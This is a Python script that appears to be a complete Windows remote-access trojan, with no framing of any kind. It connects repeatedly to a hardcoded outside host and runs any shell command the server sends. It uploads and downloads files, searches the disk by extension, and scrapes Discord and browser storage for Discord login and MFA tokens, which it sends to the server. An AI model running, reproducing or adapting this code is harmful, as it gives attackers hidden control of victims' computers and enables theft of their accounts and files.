import socket
import subprocess
import os
import getpass
import time
import re

HEADER = 50
HOST = 'webtools.onthewifi.com'
PORT = 5969

def ft(path):
    path += '\\Local Storage\\leveldb'
    
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def st():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    tl = ""
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'OperaGX': roaming + '\\Opera Software\\Opera GX Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = ft(path)

        tl += f"{platform}\n"

        if len(tokens) > 0:
            for token in tokens:
                tl += f'{token}\n'
        else:
            tl += 'No tokens found.\n'
        
        tl += "\n"

    return tl

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        s.setblocking(1)
        while True:
            try:
                s.connect((HOST,PORT))
                break
            except socket.error:
                time.sleep(10)

        def read_code(cmd):
            shell = subprocess.Popen(cmd,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            shell_out,shell_err = shell.communicate()
            msg = str(shell_out.decode('windows-1252')) + str(shell_err.decode('windows-1252'))
            return msg


        while True:
            loc = os.getcwd()
            cmd_header = s.recv(HEADER)
            cmd_len = int(cmd_header.decode('utf-8').strip())
            cmd = s.recv(cmd_len)
            cmd = str(cmd.decode('utf-8'))

            if cmd.lower().startswith('dwln'):
                try:
                    req_file = cmd.replace('dwln ','').strip()
                    data = str(os.path.getsize(req_file)).encode('utf-8')
                    head = f'{len(data):<50}'.encode()
                    msg = head + data
                    s.send(msg)
                    file = open(req_file,'rb')
                    chunk = file.read(1024)
                    while chunk:
                        s.send(chunk)
                        chunk = file.read(1024)
                except FileNotFoundError:
                    pass
                    
            if cmd.lower().startswith('send'):
                try:
                    size_len = s.recv(HEADER)
                    size_len = int(size_len.decode('utf-8').strip())
                    size = s.recv(size_len)
                    size = int(size.decode('utf-8'))
                    paths = cmd[5:]
                    all_paths = paths.split('>')
                    file_name = os.path.basename(all_paths[0].strip())
                    #If destination path is not specified the file is stored in the current working directory.
                    if len(all_paths) > 1:
                        dest_path = all_paths[1].strip()+'\\'+file_name
                    else:
                        dest_path = loc+'\\'+file_name
                    file = open(dest_path,'wb')
                    count = 0
                    while count < size :
                        chunk = s.recv(1024)
                        file.write(chunk)
                        count += len(chunk)
                    file.close()
                    print("Done.")
                except Exception as e:
                    print(e)

            elif cmd.lower().startswith('tlg'):
                td = st()
                s.send(str.encode(td))

            elif cmd.lower().startswith("findx"):
                filetype = cmd.replace("findx ", "")

                bstr = ""
                res = []
                print("Discovering files...")
                for root, dirs, files in os.walk(os.getcwd()):
                    for file in files:
                        if file.endswith(filetype):
                            res.append(os.path.join(root, file))

                for i in range(len(res)):
                    bstr += res[i] + "==33=="

                s.send(str.encode(str(bstr)))


            elif cmd.lower().startswith('cd'):
                lines = cmd.split(' ')
                if lines[1] == '..':
                    loc = loc.split('\\')[:-1]
                    loc = '\\'.join(loc)
                    os.chdir(loc)
                else:
                    try:
                        os.chdir(' '.join(lines[1:]))
                        loc=os.getcwd()
                    except FileNotFoundError:
                        pass
                msg = read_code(cmd)
                msg = msg + loc+'>'
                s.send(msg.encode('utf-8'))
            elif cmd.lower().strip() == 'name':
                name = getpass.getuser()
                s.send(str.encode(name))

            else:
                msg = read_code(cmd)
                msg = msg + loc+'>'
                s.send(msg.encode('utf-8'))
    except Exception:
        pass
